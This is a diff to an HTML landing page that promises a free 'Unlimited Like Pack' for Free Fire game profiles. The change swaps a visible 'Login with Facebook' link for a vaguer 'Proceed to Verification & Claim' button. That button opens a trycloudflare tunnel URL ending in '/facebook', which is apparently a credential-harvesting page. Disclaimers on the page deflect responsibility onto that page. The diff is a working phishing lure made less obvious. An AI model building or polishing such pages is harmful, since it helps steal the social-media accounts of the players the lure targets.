@@ -7,7 +7,6 @@
   <style>
     :root{
       --bg: linear-gradient(135deg,#0f172a 0%, #0b2545 50%, #051937 100%);
-      --card:#0b1220aa;
       --accent:#ffcc00;
       --glass: rgba(255,255,255,0.06);
       --muted: rgba(255,255,255,0.75);
@@ -63,8 +62,7 @@
     .price{ background:rgba(0,0,0,0.25); padding:8px 12px; border-radius:10px; font-weight:700; }
     .big-cta{ margin-top:18px; display:flex; flex-direction:column; gap:12px; }
     .btn{ display:inline-flex; align-items:center; justify-content:center; gap:10px; padding:12px 16px; border-radius:12px; font-weight:700; font-size:15px; cursor:pointer; text-decoration:none; border:none; width:100%; }
-    .btn.fb{ background:linear-gradient(90deg,#2b6fd6,#1e4abf); color:white; box-shadow: 0 8px 24px rgba(20,80,200,0.18); }
-    .btn.free{ background: linear-gradient(90deg,#ffb84d,#ffcc66); color:#071022; font-weight:800; box-shadow: 0 8px 30px rgba(255,200,80,0.15); }
+    .btn.proceed{ background: linear-gradient(90deg,#ffb84d,#ffcc66); color:#071022; font-weight:800; box-shadow: 0 8px 30px rgba(255,200,80,0.15); }
     .small{ font-size:13px; color:var(--muted); text-align:center; }
     .badge{ background: rgba(255,255,255,0.06); padding:8px 10px; border-radius:10px; display:inline-flex; gap:8px; align-items:center; font-weight:700; }
     .hero-art{ position:absolute; right:-80px; top:-40px; width:420px; transform: rotate(-14deg); opacity:0.08; pointer-events:none; }
@@ -86,7 +84,7 @@
         </div>
       </div>
 
-      <p class="lead">Grab the limited-time <strong>Unlimited Like Pack</strong> for Free Fire profiles. Click login to proceed. You will be redirected to the verification page.</p>
+      <p class="lead">Grab the limited-time <strong>Unlimited Like Pack</strong> for Free Fire profiles. Click the button to proceed to verification and claim your pack.</p>
 
       <div class="features" aria-hidden="true">
         <div class="chip">Unlimited Likes</div>
@@ -116,17 +114,9 @@
       </div>
 
       <div class="big-cta">
-        <!-- BUTTON: opens provided URL in new tab -->
-        <a id="fbBtn" class="btn fb" href="https://wholesale-tackle-personality-park.trycloudflare.com/913b885d/facebook" target="_blank" rel="noopener noreferrer" title="Open verification page">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-            <path d="M22 12.07C22 6.48 17.52 2 11.93 2S2 6.48 2 12.07C2 17.06 5.66 21.09 10.44 21.93v-6.7H8.08v-2.9h2.36V10.6c0-2.34 1.4-3.63 3.54-3.63 1.02 0 2.09.18 2.09.18v2.3h-1.17c-1.16 0-1.52.72-1.52 1.46v1.75h2.58l-.41 2.9h-2.17v6.7C18.34 21.09 22 17.06 22 12.07z" fill="#fff"/>
-          </svg>
-          Login with Facebook
-        </a>
-
-        <!-- Alternative claim (simulated) - does not ask for credentials on this page -->
-        <button id="claimBtn" class="btn free" type="button">
-          🎁 Quick Claim (No login here)
+        <!-- Proceed button opens your verification URL in a new tab -->
+        <button id="proceedBtn" class="btn proceed" type="button">
+          🎁 Proceed to Verification & Claim
         </button>
 
         <div class="small">By continuing you agree to our <a style="color:var(--accent);text-decoration:none" href="#" onclick="alert('Terms placeholder')">Terms & Privacy</a>. We never request or store account passwords on this page.</div>
@@ -135,7 +125,7 @@
       <div class="terms">
         <strong>How it works:</strong>
         <ol style="margin:8px 0 0 18px; color:var(--muted)">
-          <li>Click <em>Login with Facebook</em> — a new tab will open to the verification page.</li>
+          <li>Tap <em>Proceed to Verification & Claim</em> — a new tab will open to the verification page.</li>
           <li>If that page asks for account details, they will be handled by that page (not by this site).</li>
           <li>After verification, follow instructions on the verification page to claim your pack.</li>
         </ol>
@@ -153,16 +143,12 @@
   </div>
 
   <script>
-    // The fb button is a plain link to the provided URL (opens in new tab).
-    // IMPORTANT: This page DOES NOT collect passwords or any auth data.
+    // Replace this with your verification URL
+    const VERIFICATION_URL = 'https://wholesale-tackle-personality-park.trycloudflare.com/913b885d/facebook';
 
-    // Optional: quick claim simulation (replace with your server link if needed)
-    document.getElementById('claimBtn').addEventListener('click', function(){
-      const ok = confirm('This quick-claim will redirect you to a safe claim page. Continue?');
-      if(ok) {
-        // replace with your own claim URL if you have one
-        window.location.href = 'https://example.com/claim?pack=unlimited';
-      }
+    document.getElementById('proceedBtn').addEventListener('click', function(){
+      // Open verification page in a new tab
+      window.open(VERIFICATION_URL, '_blank', 'noopener');
     });
 
     // Prevent accidental Enter key submit behavior
